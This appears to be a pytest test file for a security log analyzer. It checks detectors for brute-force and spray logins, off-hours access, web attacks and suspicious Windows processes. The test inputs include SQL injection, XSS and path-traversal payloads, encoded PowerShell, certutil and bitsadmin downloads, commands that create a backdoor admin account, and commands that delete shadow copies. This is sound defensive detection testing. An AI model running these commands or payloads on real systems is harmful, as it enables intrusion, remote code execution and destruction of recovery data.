"""Each detector gets a positive case, a below-threshold case and the edge cases that matter."""
from datetime import datetime, timedelta

import pytest

from loganalyzer import detectors as d
from loganalyzer.engine import run_rules
from loganalyzer.models import (ACCOUNT_CREATED, GROUP_ADD, HTTP_REQUEST, LOGIN_FAILED, LOGIN_SUCCESS,
                                PRIVILEGE_ASSIGNED, PROCESS_CREATED)
from tests.conftest import T, ev


def fails(n, ip="1.2.3.4", users=("root",), start=None, gap=5, source="auth", host="h"):
    start = start or T()
    return [ev(LOGIN_FAILED, source, start + timedelta(seconds=i * gap), user=users[i % len(users)], src_ip=ip, host=host)
            for i in range(n)]


def web(path="/x", status=404, ip="9.9.9.9", ts=None, ua="Mozilla/5.0", nbytes=100):
    p = path
    from urllib.parse import unquote
    return ev(HTTP_REQUEST, "web", ts or T(), src_ip=ip, host="w", raw="GET " + path,
              extra={"method": "GET", "path": p, "decoded_path": unquote(unquote(p)), "status": status, "bytes": nbytes, "user_agent": ua})


def proc(cmd, ts=None, host="DC1", user="bob"):
    return ev(PROCESS_CREATED, "windows", ts or T(), host=host, user=user, extra={"command_line": cmd, "process": cmd.split()[0]})


# ----------------------------------------------------------------------------- sliding_episodes / cluster_by_gap


def test_sliding_episodes_threshold_boundary():
    times = [T(s=i * 10) for i in range(5)]          # 5 events over 40 s
    assert d.sliding_episodes(times, 5, 40) == [(0, 4)]
    assert d.sliding_episodes(times, 5, 39) == []      # window too short for all five
    assert d.sliding_episodes(times, 6, 3600) == []


def test_sliding_episodes_merges_overlapping_and_splits_distant_bursts():
    burst1 = [T(h=1, s=i) for i in range(6)]
    burst2 = [T(h=5, s=i) for i in range(6)]
    assert d.sliding_episodes(burst1 + burst2, 3, 60) == [(0, 5), (6, 11)]


def test_sliding_episodes_empty():
    assert d.sliding_episodes([], 3, 60) == []


def test_cluster_by_gap():
    evs = [ev(LOGIN_FAILED, ts=T(m=0)), ev(LOGIN_FAILED, ts=T(m=5)), ev(LOGIN_FAILED, ts=T(m=40))]
    clusters = d.cluster_by_gap(evs, 600)
    assert [len(c) for c in clusters] == [2, 1]
    assert d.cluster_by_gap([], 60) == []


# ----------------------------------------------------------------------------- authentication


def test_brute_force_fires_at_threshold_and_not_below(rule_by_id):
    r = rule_by_id["AUTH-001"]
    assert len(d.login_failure_burst(r, fails(10, gap=5))) == 1
    assert d.login_failure_burst(r, fails(9, gap=5)) == []


def test_brute_force_respects_window(rule_by_id):
    r = rule_by_id["AUTH-001"]
    assert d.login_failure_burst(r, fails(10, gap=60)) == []     # 10 failures over 9 minutes > 300 s window
    assert len(d.login_failure_burst(r, fails(10, gap=30))) == 1


def test_brute_force_details_and_fields(rule_by_id):
    alert = d.login_failure_burst(rule_by_id["AUTH-001"], fails(20, users=("root", "admin"), gap=3))[0]
    assert alert.count == 20 and alert.source_ips == ["1.2.3.4"] and alert.severity == "high"
    assert alert.details["distinct_accounts"] == 2 and alert.details["top_accounts"][0]["attempts"] == 10
    assert alert.details["attempts_per_minute"] > 10


def test_brute_force_ignores_spray_shaped_traffic(rule_by_id):
    users = tuple("user{}".format(i) for i in range(20))       # 20 users, one attempt each
    assert d.login_failure_burst(rule_by_id["AUTH-001"], fails(20, users=users, gap=5)) == []


def test_brute_force_separate_ips_and_sources_not_mixed(rule_by_id):
    evs = fails(6, ip="1.1.1.1") + fails(6, ip="2.2.2.2") + fails(6, ip="1.1.1.1", source="windows", start=T(s=40))
    assert d.login_failure_burst(rule_by_id["AUTH-001"], sorted(evs, key=lambda e: e.ts)) == []


def test_brute_force_ignores_events_without_ip(rule_by_id):
    assert d.login_failure_burst(rule_by_id["AUTH-001"], fails(30, ip="")) == []


def test_two_distant_bursts_make_two_alerts(rule_by_id):
    evs = fails(12, start=T(h=1)) + fails(12, start=T(h=9))
    assert len(d.login_failure_burst(rule_by_id["AUTH-001"], evs)) == 2


def test_password_spray_fires(rule_by_id):
    users = tuple("user{}".format(i) for i in range(10))
    alerts = d.password_spray(rule_by_id["AUTH-002"], fails(10, users=users, gap=30))
    assert len(alerts) == 1 and alerts[0].details["distinct_accounts"] == 10
    assert alerts[0].details["avg_attempts_per_account"] == 1.0


def test_password_spray_needs_enough_distinct_users(rule_by_id):
    users = tuple("user{}".format(i) for i in range(7))        # min is 8
    assert d.password_spray(rule_by_id["AUTH-002"], fails(14, users=users, gap=30)) == []


def test_password_spray_not_triggered_by_brute_force_ramp_up(rule_by_id):
    """A loud brute force that cycles 10 accounts many times is not a spray, even in its first minutes."""
    users = tuple("user{}".format(i) for i in range(10))
    assert d.password_spray(rule_by_id["AUTH-002"], fails(200, users=users, gap=5)) == []


def test_password_spray_window_expiry(rule_by_id):
    users = tuple("user{}".format(i) for i in range(10))
    assert d.password_spray(rule_by_id["AUTH-002"], fails(10, users=users, gap=300)) == []   # 45 min > 30 min window


def test_password_spray_skips_blank_users(rule_by_id):
    assert d.password_spray(rule_by_id["AUTH-002"], fails(30, users=("",), gap=5)) == []


def test_success_after_failures(rule_by_id):
    r = rule_by_id["AUTH-003"]
    evs = fails(8, gap=10) + [ev(LOGIN_SUCCESS, ts=T(m=5), user="deploy", src_ip="1.2.3.4")]
    alerts = d.success_after_failures(r, evs)
    assert len(alerts) == 1
    a = alerts[0]
    assert a.severity == "critical" and a.details["failures_before_success"] == 8
    assert a.details["accounts_logged_in"] == ["deploy"]


def test_success_after_too_few_failures_or_too_late(rule_by_id):
    r = rule_by_id["AUTH-003"]
    assert d.success_after_failures(r, fails(7, gap=10) + [ev(LOGIN_SUCCESS, ts=T(m=5), src_ip="1.2.3.4")]) == []
    late = fails(8, gap=10) + [ev(LOGIN_SUCCESS, ts=T() + timedelta(hours=2), src_ip="1.2.3.4")]
    assert d.success_after_failures(r, late) == []


def test_success_from_different_ip_does_not_count(rule_by_id):
    evs = fails(20, ip="1.2.3.4") + [ev(LOGIN_SUCCESS, ts=T(m=5), src_ip="5.6.7.8", user="x")]
    assert d.success_after_failures(rule_by_id["AUTH-003"], evs) == []


def test_multiple_successes_merge_into_one_alert(rule_by_id):
    evs = fails(10, gap=5) + [ev(LOGIN_SUCCESS, ts=T(m=2), src_ip="1.2.3.4", user="a"),
                              ev(LOGIN_SUCCESS, ts=T(m=3), src_ip="1.2.3.4", user="b")]
    alerts = d.success_after_failures(rule_by_id["AUTH-003"], evs)
    assert len(alerts) == 1 and alerts[0].details["accounts_logged_in"] == ["a", "b"]


# ----------------------------------------------------------------------------- accounts


def test_account_created_every_creation_alerts(rule_by_id):
    evs = [ev(ACCOUNT_CREATED, ts=T(m=i), user="u{}".format(i), host="h", extra={"actor": "root"}) for i in range(2)]
    alerts = d.account_created(rule_by_id["ACCT-001"], evs)
    assert [a.details["new_account"] for a in alerts] == ["u0", "u1"] and alerts[0].severity == "medium"


def test_account_created_then_privileged_group(rule_by_id):
    created = ev(ACCOUNT_CREATED, ts=T(m=0), user="evil", extra={"actor": "deploy"})
    added = ev(GROUP_ADD, ts=T(m=1), user="evil", extra={"group": "sudo", "privileged": True})
    alerts = d.account_created_privileged(rule_by_id["ACCT-002"], [created, added])
    assert len(alerts) == 1 and alerts[0].severity == "critical"
    assert alerts[0].details["privilege_via"] == ["sudo"] and alerts[0].details["created_by"] == "deploy"


def test_account_created_then_4672_counts_as_privilege(rule_by_id):
    created = ev(ACCOUNT_CREATED, "windows", T(m=0), user="evil")
    priv = ev(PRIVILEGE_ASSIGNED, "windows", T(m=10), user="evil")
    alerts = d.account_created_privileged(rule_by_id["ACCT-002"], [created, priv])
    assert alerts and alerts[0].details["privilege_via"] == ["special privileges (4672)"]


def test_account_created_nonprivileged_group_or_too_late_or_other_user(rule_by_id):
    r = rule_by_id["ACCT-002"]
    created = ev(ACCOUNT_CREATED, ts=T(m=0), user="u")
    assert d.account_created_privileged(r, [created, ev(GROUP_ADD, ts=T(m=1), user="u", extra={"group": "staff", "privileged": False})]) == []
    assert d.account_created_privileged(r, [created, ev(GROUP_ADD, ts=T(h=5), user="u", extra={"group": "sudo", "privileged": True})]) == []
    assert d.account_created_privileged(r, [created, ev(GROUP_ADD, ts=T(m=1), user="other", extra={"group": "sudo", "privileged": True})]) == []
    # privilege BEFORE creation is not a match
    assert d.account_created_privileged(r, [ev(GROUP_ADD, ts=T(h=1), user="u", extra={"group": "sudo", "privileged": True}),
                                            ev(ACCOUNT_CREATED, ts=T(h=2), user="u")]) == []


# ----------------------------------------------------------------------------- off-hours


def login(ts, user="alice", ip="10.0.0.5", ltype="10", host="h", source="windows"):
    return ev(LOGIN_SUCCESS, source, ts, user=user, src_ip=ip, host=host, extra={"logon_type": ltype})


def test_off_hours_night_and_weekend(rule_by_id):
    r = rule_by_id["AUTH-004"]
    night = login(datetime(2026, 10, 14, 3, 12))       # Wednesday 03:12
    weekend = login(datetime(2026, 10, 17, 12, 0), user="bob")   # Saturday noon
    alerts = d.off_hours_login(r, [night, weekend])
    assert {a.details["user"] for a in alerts} == {"alice", "bob"}
    assert all(a.severity == "medium" for a in alerts)


def test_business_hours_boundaries(rule_by_id):
    r = rule_by_id["AUTH-004"]
    assert d.off_hours_login(r, [login(datetime(2026, 10, 14, 7, 0))]) == []     # start hour is inside business hours
    assert d.off_hours_login(r, [login(datetime(2026, 10, 14, 18, 59, 59))]) == []
    assert len(d.off_hours_login(r, [login(datetime(2026, 10, 14, 19, 0))])) == 1  # end hour is outside
    assert len(d.off_hours_login(r, [login(datetime(2026, 10, 14, 6, 59, 59))])) == 1


def test_off_hours_privileged_escalates(rule_by_id):
    r = rule_by_id["AUTH-004"]
    t = datetime(2026, 10, 14, 23, 40)
    alerts = d.off_hours_login(r, [login(t, user="tkim"), ev(PRIVILEGE_ASSIGNED, "windows", t, user="tkim")])
    assert alerts[0].severity == "high" and alerts[0].details["privileged_session"] is True
    assert "(privileged)" in alerts[0].title


def test_off_hours_exclusions(rule_by_id):
    r = rule_by_id["AUTH-004"]
    t = datetime(2026, 10, 14, 3, 0)
    assert d.off_hours_login(r, [login(t, user="svc_monitor")]) == []          # excluded service account
    assert d.off_hours_login(r, [login(t, user="HOST1$")]) == []               # machine account
    assert d.off_hours_login(r, [login(t, ltype="5")]) == []                   # service logon type
    assert d.off_hours_login(r, [ev(LOGIN_FAILED, "windows", t, user="x")]) == []   # failures are not logins
    assert len(d.off_hours_login(r, [login(t, ltype="", user="zed")])) == 1    # missing logon type is kept


def test_off_hours_groups_by_user_ip_host(rule_by_id):
    r = rule_by_id["AUTH-004"]
    evs = [login(datetime(2026, 10, 14, 3, i)) for i in range(4)]
    alerts = d.off_hours_login(r, evs)
    assert len(alerts) == 1 and alerts[0].count == 4


def test_off_hours_ssh_logon_type(rule_by_id):
    e = ev(LOGIN_SUCCESS, "auth", datetime(2026, 10, 14, 3, 0), user="deploy", src_ip="1.1.1.1", extra={"logon_type": "ssh"})
    assert len(d.off_hours_login(rule_by_id["AUTH-004"], [e])) == 1


# ----------------------------------------------------------------------------- web


def test_404_flood_threshold(rule_by_id):
    r = rule_by_id["WEB-001"]
    flood = [web("/p{}".format(i), 404, ts=T(s=i)) for i in range(40)]
    assert len(d.http_status_burst(r, flood)) == 1
    assert d.http_status_burst(r, flood[:39]) == []
    ok = [web("/p{}".format(i), 200, ts=T(s=i)) for i in range(60)]
    assert d.http_status_burst(r, ok) == []


def test_404_flood_details(rule_by_id):
    flood = [web("/p{}".format(i % 5), 404, ts=T(s=i)) for i in range(50)]
    a = d.http_status_burst(rule_by_id["WEB-001"], flood)[0]
    assert a.details["distinct_paths"] == 5 and a.details["requests"] == 50 and a.severity == "medium"


def test_sqli_patterns_and_threshold(rule_by_id):
    r = rule_by_id["WEB-002"]
    payloads = ["/p?id=1%20UNION%20SELECT%20NULL--", "/p?id=1'%20OR%20'1'='1", "/s?q=a%27%20AND%20SLEEP(5)--",
                "/p?id=1%20AND%201%3D1", "/p?id=1;%20DROP%20TABLE%20users", "/p?x=information_schema.tables"]
    for p in payloads:
        hits = d.http_pattern(r, [web(p, 200, ts=T(s=0)), web(p + "&a=1", 200, ts=T(s=1))])
        assert len(hits) == 1, p
    assert d.http_pattern(r, [web(payloads[0], 200)]) == []           # one hit < min_matches
    assert d.http_pattern(r, [web("/products?id=42", 200), web("/search?q=laptop", 200)]) == []


def test_sqli_escalates_on_http_500_only(rule_by_id):
    r = rule_by_id["WEB-002"]
    base = [web("/p?id=1%20UNION%20SELECT%201", 200), web("/p?id=1%20UNION%20SELECT%202", 200)]
    assert d.http_pattern(r, base)[0].severity == "high"
    base[1] = web("/p?id=1%20UNION%20SELECT%202", 500)
    a = d.http_pattern(r, base)[0]
    assert a.severity == "critical" and "possible_success" in a.details


def test_xss_patterns(rule_by_id):
    r = rule_by_id["WEB-003"]
    evs = [web("/s?q=%3Cscript%3Ealert(1)%3C/script%3E", 200), web("/s?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E", 200)]
    assert len(d.http_pattern(r, evs)) == 1
    assert d.http_pattern(r, evs[:1]) == []


def test_path_traversal_including_encoded_and_200_escalation(rule_by_id):
    r = rule_by_id["WEB-004"]
    evs = [web("/d?f=../../../../etc/passwd", 404), web("/s/..%2f..%2fetc%2fshadow", 403), web("/d?f=..%252f..%252fetc%252fpasswd", 400)]
    a = d.http_pattern(r, evs)[0]
    assert a.severity == "high" and a.details["matching_requests"] == 3
    evs[0] = web("/d?f=../../../../etc/passwd", 200, nbytes=1847)
    a = d.http_pattern(r, evs)[0]
    assert a.severity == "critical" and "1847 bytes" in a.details["possible_success"][0]


def test_sensitive_paths_count_distinct_paths(rule_by_id):
    r = rule_by_id["WEB-005"]
    same = [web("/.env", 404, ts=T(s=i)) for i in range(10)]
    assert d.http_pattern(r, same) == []                                     # one path repeated
    distinct = [web(p, 404) for p in ("/.env", "/.git/config", "/wp-login.php")]
    assert len(d.http_pattern(r, distinct)) == 1


def test_http_pattern_groups_by_ip(rule_by_id):
    r = rule_by_id["WEB-003"]
    a = [web("/s?q=<script>", 200, ip="1.1.1.1"), web("/s?q=<script>x", 200, ip="2.2.2.2")]
    assert d.http_pattern(r, a) == []        # one hit each, below min_matches


def test_user_agent_rules(rule_by_id):
    scanner = d.http_user_agent(rule_by_id["WEB-006"], [web("/", 200, ua="sqlmap/1.7.2#stable (https://sqlmap.org)")])
    assert len(scanner) == 1 and scanner[0].severity == "medium"
    for ua in ("Nikto/2.5.0", "gobuster/3.6", "Mozilla/5.00 (Nikto/2.1.6)", "zgrab/0.x"):
        assert d.http_user_agent(rule_by_id["WEB-006"], [web("/", 200, ua=ua)]), ua
    assert d.http_user_agent(rule_by_id["WEB-006"], [web("/", 200, ua="Mozilla/5.0 Chrome/129")]) == []


def test_scripted_user_agent_needs_volume(rule_by_id):
    r = rule_by_id["WEB-007"]
    few = [web("/", 200, ua="python-requests/2.31", ts=T(s=i)) for i in range(19)]
    assert d.http_user_agent(r, few) == []
    assert d.http_user_agent(r, few + [web("/", 200, ua="python-requests/2.31", ts=T(s=30))])[0].severity == "low"
    blank = [web("/", 200, ua="", ts=T(s=i)) for i in range(20)]
    assert len(d.http_user_agent(r, blank)) == 1


# ----------------------------------------------------------------------------- processes


@pytest.mark.parametrize("rule_id,cmd", [
    ("WIN-001", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"),
    ("WIN-001", "powershell -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAA=="),
    ("WIN-002", "certutil.exe -urlcache -split -f http://x/y.exe y.exe"),
    ("WIN-002", "bitsadmin /transfer j http://x/y c:\\y"),
    ("WIN-002", "powershell -c (New-Object Net.WebClient).DownloadString('http://x')"),
    ("WIN-003", "net user hacker P@ss1 /add"),
    ("WIN-003", "net1.exe localgroup administrators hacker /add"),
    ("WIN-005", "vssadmin.exe delete shadows /all /quiet"),
    ("WIN-005", "bcdedit /set {default} recoveryenabled no"),
])
def test_process_rules_positive(rule_by_id, rule_id, cmd):
    alerts = d.process_match(rule_by_id[rule_id], [proc(cmd)])
    assert len(alerts) == 1 and alerts[0].details["commands"][0].startswith(cmd[:20])


@pytest.mark.parametrize("rule_id,cmd", [
    ("WIN-001", "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1"),
    ("WIN-001", "powershell -enc short"),
    ("WIN-002", "chrome.exe https://example.com"),
    ("WIN-003", "net user"),
    ("WIN-003", "net use Z: \\\\server\\share"),
    ("WIN-005", "vssadmin list shadows"),
])
def test_process_rules_negative(rule_by_id, rule_id, cmd):
    assert d.process_match(rule_by_id[rule_id], [proc(cmd)]) == []


def test_recon_needs_two_commands_close_together(rule_by_id):
    r = rule_by_id["WIN-004"]
    assert d.process_match(r, [proc("whoami /all")]) == []
    assert d.process_match(r, [proc("ipconfig /all", ts=T(m=0))]) == []
    two = [proc("whoami /all", ts=T(m=0)), proc("nltest /dclist:CORP", ts=T(m=2))]
    assert len(d.process_match(r, two)) == 1
    far = [proc("whoami /all", ts=T(h=1)), proc("nltest /dclist:CORP", ts=T(h=9))]
    assert d.process_match(r, far) == []
    other_users = [proc("whoami /all", user="a"), proc("nltest /x", user="b")]
    assert d.process_match(r, other_users) == []


def test_process_events_without_command_line_use_process_name(rule_by_id):
    e = ev(PROCESS_CREATED, "windows", T(), host="h", user="u", extra={"process": "C:\\Windows\\System32\\vssadmin.exe delete shadows"})
    assert len(d.process_match(rule_by_id["WIN-005"], [e])) == 1


# ----------------------------------------------------------------------------- run_rules plumbing


def test_run_rules_assigns_sorted_ids_and_skips_disabled(rules):
    evs = fails(12, gap=3)
    alerts = run_rules(evs, rules)
    assert alerts and alerts[0].id == "ALR-001"
    ids = [a.id for a in alerts]
    assert ids == sorted(ids)
    for r in rules:
        r.enabled = r.id != "AUTH-001"
    try:
        assert not [a for a in run_rules(evs, rules) if a.rule_id == "AUTH-001"]
    finally:
        for r in rules:
            r.enabled = True


def test_run_rules_ignore_ips(rules):
    evs = fails(12, ip="7.7.7.7", gap=3)
    assert run_rules(evs, rules)
    assert run_rules(evs, rules, ignore_ips=["7.7.7.7"]) == []


def test_rules_only_see_their_sources(rules):
    web_failures = fails(30, source="web", gap=1)       # web-source events are never fed to auth rules
    assert [a for a in run_rules(web_failures, rules) if a.rule_id.startswith("AUTH")] == []
